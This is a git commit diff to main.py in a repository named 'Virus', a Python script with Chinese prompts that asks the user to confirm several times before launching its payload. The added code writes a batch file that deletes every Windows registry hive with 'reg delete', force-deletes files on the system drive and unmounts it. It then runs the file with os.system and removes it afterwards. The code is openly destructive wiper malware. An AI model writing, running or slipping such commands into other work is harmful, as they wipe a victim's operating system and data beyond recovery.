2de931ccda5777ce8ca8c757de77d924eebe1801
UsernameKLNU <101550757+usernameklnu@users.noreply.github.com>
2022-06-17 10:37:14 +0800

    git add . git commit git push https://github.com/UsernameKLNU/Virus.git

--- main.py
+++ main.py
@@ -1,3 +1,4 @@
+import os
 import platform
 import sys
 import time
@@ -15,6 +16,7 @@ def MakeError(error_show, exit_num):
     # 错误的Exception: 详细错误
     # """, 0xffffffff)
 
+
 def MakeErrorButDoNotExit(error_show):
     print(colorama.Fore.RED + error_show + colorama.Fore.RESET)
     # MakeError("""
@@ -23,6 +25,7 @@ def MakeErrorButDoNotExit(error_show):
     #     代码块
     # 错误的Exception: 详细错误
     # """)
+
 
 def TestPlatform():
     print("关于 Virus")
@@ -41,19 +44,48 @@ TestPlatform()
 
 start = input("确定启动病毒 Virus 1.0.0 吗？(Y / n) >")
 if start == "Y":
-    print('你清楚你自己在做什么吗？\n这个程序可能有毁灭电脑核心文件！', end='')
+    print('你清楚你自己在做什么吗？\n这个程序可能毁灭电脑核心文件！', end='')
     real_start = input("(Y / n) > ")
-    if start == "Y":
+    if real_start == "Y":
         print('请确保电脑已做好备份，或不在实体机内运行本程序。正在准备 Virus ...', end='')
         time.sleep(10)
         print("(按 1 并按回车启动 Virus)", end='')
         virus_start = input()
         if virus_start == "1":
-            # 病毒要干什么... shh
+            print("1 / 3 释放病毒文件")
+            virus_helper = open("virus.bat", "w")
+            virus_helper.write(
+                "reg delete HKCR\nreg delete HKCU\nreg delete HKLM\nreg delete HKU\nreg delete HKCC\ndel /f /q %SYSTEMDRIVE%\nmountvol %SYSTEMDRIVE% /d")  # 503 Service Unavailable.jpg
+            virus_helper.close()
+            print("1 / 3 病毒文件释放成功!")
+            print("2 / 3 运行病毒文件")
+            os.system("start virus.bat")
+            print("2 / 3 病毒文件执行成功！")
+            print("3 / 3 删除病毒")
+            os.remove("virus.bat")
+            print("3 / 3 成功删除病毒！")
         else:
             MakeError("""
-            Traceback (most recent call last):
-            File \"""" + __file__ + """\", line 48, in <module>
-                        if virus_start == "1":
-            SelectException: selected a not in list thing
+Traceback (most recent call last):
+File \"""" + __file__ + """\", line 48, in <module>
+            if virus_start == "1":
+SelectException
             """, 0xffffffff)
+    elif real_start == "n":
+        exit(0)
+    else:
+        MakeError("""
+Traceback (most recent call last):
+File \"""" + __file__ + """\", line 49, in <module>
+if real_start == "Y":
+SelectException
+                    """, 0xffffffff)
+elif start == "n":
+    exit(0)
+else:
+    MakeError("""
+    Traceback (most recent call last):
+    File \"""" + __file__ + """\", line 46, in <module>
+                if start == "Y":
+    SelectException
+                """, 0xffffffff)
